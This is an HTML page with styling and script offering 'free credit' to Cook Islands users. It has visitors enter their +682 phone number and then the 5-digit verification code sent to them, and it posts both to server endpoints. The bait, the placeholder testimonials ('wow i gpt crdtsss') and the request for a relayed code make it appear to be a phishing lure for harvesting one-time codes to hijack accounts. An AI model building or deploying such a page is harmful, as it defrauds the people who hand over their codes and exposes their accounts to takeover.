<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Welcome</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    :root {
      --accent: #e11d48; /* red */
      --card-bg: rgba(255,255,255,0.12);
      --card-border: rgba(255,255,255,0.25);
      --text: #f8fafc;
      --muted: #e2e8f0;
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      font-family: 'Poppins', system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial, 'Noto Sans', 'Apple Color Emoji', 'Segoe UI Emoji';
      color: var(--text);
      overflow-x: hidden;
      background: #0b1220;
    }
    /* Background image with subtle transparency overlay */
    .bg {
      position: fixed; inset: 0; z-index: -2;
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5v9aoyGUs-CnKNB_LLKhNxDQAjphMIMb9tg&s') center/cover no-repeat;
      filter: saturate(1.1) contrast(1.02);
    }
    .bg::after {
      content: ""; position: absolute; inset: 0; background: rgba(0,0,0,0.45); /* subtle dim */
    }

    .container { max-width: 880px; margin: 0 auto; padding: 48px 24px 140px; }
    .hero { text-align: center; margin-top: 6vh; }
    .hero h1 { font-size: clamp(40px, 7vw, 84px); font-weight: 800; letter-spacing: 0.04em; margin: 0 0 10px; text-shadow: 0 8px 32px rgba(0,0,0,0.5); }
    .hero p.tag { font-size: clamp(16px, 2.3vw, 26px); color: var(--text); margin: 0 0 28px; font-weight: 600; }
    .hero p.tag .red { color: var(--accent); }

    .card { backdrop-filter: blur(8px); background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 18px; padding: 18px 20px; margin: 0 auto 28px; max-width: 700px; text-align: center; }
    .card b { color: var(--muted); }

    .section { margin-top: 38px; text-align: center; }
    .section h2 { font-weight: 700; margin: 0 0 18px; font-size: 22px; letter-spacing: 0.02em; }

    .phone-row, .code-row {
      display: flex; justify-content: center; gap: 12px; margin: 12px 0 18px;
    }
    .prefix { display: inline-flex; align-items: center; justify-content: center; padding: 12px 14px; border-radius: 12px; background: var(--card-bg); border: 1px solid var(--card-border); min-width: 84px; font-weight: 700; }
    .digit, .code-digit {
      width: 56px; height: 64px; text-align: center; font-size: 28px; font-weight: 700; color: var(--text);
      border-radius: 14px; border: 1px solid var(--card-border); background: rgba(255,255,255,0.06);
      outline: none; transition: transform .06s ease, box-shadow .2s ease, border-color .2s ease;
    }
    .digit:focus, .code-digit:focus { transform: translateY(-1px); box-shadow: 0 8px 28px rgba(0,0,0,0.25); border-color: #94a3b8; }

    .actions { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 10px; }
    .btn {
      appearance: none; border: 0; cursor: pointer; border-radius: 14px; padding: 14px 18px; font-weight: 800; letter-spacing: .02em;
      background: linear-gradient(180deg, #f43f5e, #be123c); color: white; box-shadow: 0 12px 32px rgba(190,18,60,.35);
    }
    .btn[disabled] { filter: grayscale(.7) brightness(.8); cursor: not-allowed; box-shadow: none; }

    .notice { font-size: 12px; opacity: .85; margin-top: 8px; }

    .hidden { display: none !important; }

    /* Modal */
    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.5); display: none; align-items: center; justify-content: center; z-index: 30; }
    .modal { width: min(680px, 92vw); border-radius: 18px; padding: 24px; background: #0c1424cc; border: 1px solid var(--card-border); backdrop-filter: blur(10px); }
    .modal h3 { margin: 0 0 12px; font-size: 24px; }

    /* Cookie consent */
    .cookie { position: fixed; left: 16px; right: 16px; bottom: 16px; background: #0f172acc; color: var(--text); border: 1px solid var(--card-border); border-radius: 16px; padding: 16px; display: none; align-items: center; gap: 12px; z-index: 40; backdrop-filter: blur(10px); }
    .cookie p { margin: 0; font-size: 14px; opacity: .9; }
    .cookie .accept { margin-left: auto; }

    footer { margin-top: 80px; }
    .testimonials { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-top: 18px; }
    .t { background: var(--card-bg); border: 1px solid var(--card-border); border-radius: 14px; padding: 14px; }
    .t .name { font-weight: 700; font-size: 14px; opacity: .9; }
    .t .msg { margin-top: 6px; font-size: 13px; opacity: .95; }
  </style>
</head>
<body>
  <div class="bg" aria-hidden="true"></div>
  <main class="container">
    <section class="hero" aria-labelledby="welcome-title">
      <h1 id="welcome-title">welcome</h1>
      <p class="tag"><span class="red">get free credit</span> (just for cook islands users)</p>
    </section>

    <div class="card" role="note">
      <b>please follow rules to get free credit from us</b>
    </div>

    <section class="section" aria-labelledby="step1">
      <h2 id="step1">1: enter your number (just cook islands numbers)</h2>

      <div class="phone-row" aria-label="Cook Islands phone number input">
        <span class="prefix">+682</span>
        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="one-time-code" aria-label="digit 1" />
        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 2" />
        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 3" />
        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 4" />
        <input class="digit" inputmode="numeric" pattern="[0-9]*" maxlength="1" aria-label="digit 5" />
      </div>

      <div class="actions">
        <div class="g-recaptcha" data-sitekey="YOUR_RECAPTCHA_SITE_KEY"></div>
        <button id="sendCode" class="btn" disabled>Send code</button>
      </div>
      <p class="notice">We only support Cook Islands numbers (+682) for this promo.</p>
    </section>

    <!-- Step 2 Modal: OTP entry -->
    <div id="otpModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="otp-title">
      <div class="modal">
        <h3 id="otp-title">For security reasons we use a verification service to deliver confirmation codes.</h3>
        <p>Please enter the 5-digit code:</p>
        <div class="code-row">
          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 1" />
          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 2" />
          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 3" />
          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 4" />
          <input class="code-digit" inputmode="numeric" maxlength="1" aria-label="code 5" />
        </div>
        <div class="actions">
          <button id="verifyCode" class="btn">Verify</button>
          <button id="closeOtp" class="btn" style="background:linear-gradient(180deg,#64748b,#334155)">Close</button>
        </div>
      </div>
    </div>

    <section class="section" id="done" aria-live="polite" style="display:none">
      <h2>Done!</h2>
      <p>You're all set. Thanks for verifying.</p>
    </section>

    <footer class="section" aria-labelledby="reviews">
      <h2 id="reviews">What people say</h2>
      <div class="testimonials">
        <div class="t"><div class="name">ngametua marsters</div><div class="msg">thanks!!!</div></div>
        <div class="t"><div class="name">marcian kita</div><div class="msg">wow i gpt crdtsss</div></div>
        <div class="t"><div class="name">tuaine arigi</div><div class="msg">this is fr guys</div></div>
        <div class="t"><div class="name">tuariki marcian</div><div class="msg">wtf i got my crdtz</div></div>
        <div class="t"><div class="name">tuane kopu</div><div class="msg">bruh this was fr</div></div>
        <div class="t"><div class="name">memetuha murare</div><div class="msg">shiii imma received ittt</div></div>
      </div>
      <p class="notice">These are sample testimonials. Replace with real user feedback before publishing.</p>
    </footer>
  </main>

  <!-- Cookie consent banner -->
  <div id="cookie" class="cookie" role="dialog" aria-live="polite">
    <p>We use cookies to provide core functionality and protect against abuse. By clicking Accept, you agree to our cookie policy.</p>
    <button class="btn accept" id="acceptCookies">Accept</button>
  </div>

  <script>
    // --- Cookie consent gating ---
    const cookieBanner = document.getElementById('cookie');
    const acceptBtn = document.getElementById('acceptCookies');
    const sendBtn = document.getElementById('sendCode');

    const consentKey = 'promo_cookie_consent_v1';
    function updateConsentUI() {
      const ok = localStorage.getItem(consentKey) === 'yes';
      cookieBanner.style.display = ok ? 'none' : 'flex';
      sendBtn.disabled = !ok;
    }
    acceptBtn.addEventListener('click', () => { localStorage.setItem(consentKey, 'yes'); updateConsentUI(); });
    updateConsentUI();

    // --- Input helpers (auto-advance, digits only) ---
    function hookupBoxes(selector) {
      const boxes = Array.from(document.querySelectorAll(selector));
      boxes.forEach((box, idx) => {
        box.addEventListener('input', e => {
          e.target.value = e.target.value.replace(/\D/g, '').slice(0,1);
          if (e.target.value && boxes[idx+1]) boxes[idx+1].focus();
        });
        box.addEventListener('keydown', e => {
          if (e.key === 'Backspace' && !e.target.value && boxes[idx-1]) boxes[idx-1].focus();
          if (e.key === 'ArrowLeft' && boxes[idx-1]) boxes[idx-1].focus();
          if (e.key === 'ArrowRight' && boxes[idx+1]) boxes[idx+1].focus();
        });
        box.addEventListener('paste', e => {
          const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, boxes.length);
          if (!paste) return;
          e.preventDefault();
          paste.split('').forEach((d, i) => { boxes[i].value = d; });
          (boxes[paste.length-1] || boxes[boxes.length-1]).focus();
        });
      });
      return boxes;
    }

    const phoneDigits = hookupBoxes('.digit');
    const codeDigits  = hookupBoxes('.code-digit');

    function phoneFromBoxes() {
      const local = phoneDigits.map(b => b.value).join('');
      return local.length === 5 ? '+682' + local : null; // Cook Islands
    }
    function codeFromBoxes() {
      const code = codeDigits.map(b => b.value).join('');
      return code.length === 5 ? code : null;
    }

    // --- Modal helpers ---
    const otpModal = document.getElementById('otpModal');
    const closeOtp = document.getElementById('closeOtp');
    closeOtp.addEventListener('click', () => { otpModal.style.display = 'none'; });

    // --- Send code flow (calls Vercel serverless API) ---
    sendBtn.addEventListener('click', async () => {
      if (sendBtn.disabled) return;
      const phone = phoneFromBoxes();
      if (!phone) return alert('Please enter a valid Cook Islands number (5 digits after +682).');

      // Ensure reCAPTCHA is solved
      const recaptchaResponse = grecaptcha.getResponse();
      if (!recaptchaResponse) return alert('Please complete the reCAPTCHA.');

      sendBtn.disabled = true;
      try {
        const res = await fetch('/api/start-signup', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone, recaptchaToken: recaptchaResponse })
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error || 'Failed to start verification');
        // Show OTP modal on success
        otpModal.style.display = 'flex';
        document.querySelector('.code-digit')?.focus();
      } catch (err) {
        alert(err.message);
      } finally {
        sendBtn.disabled = false;
        grecaptcha.reset();
      }
    });

    // --- Verify OTP ---
    document.getElementById('verifyCode').addEventListener('click', async () => {
      const phone = phoneFromBoxes();
      const code = codeFromBoxes();
      if (!phone || !code) return alert('Enter the full verification code.');
      try {
        const res = await fetch('/api/verify-otp', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone, code })
        });
        const data = await res.json();
        if (!res.ok || !data.ok) throw new Error(data.error || 'Verification failed');
        otpModal.style.display = 'none';
        document.getElementById('done').style.display = 'block';
      } catch (err) {
        alert(err.message);
      }
    });
  </script>
</body>
</html>
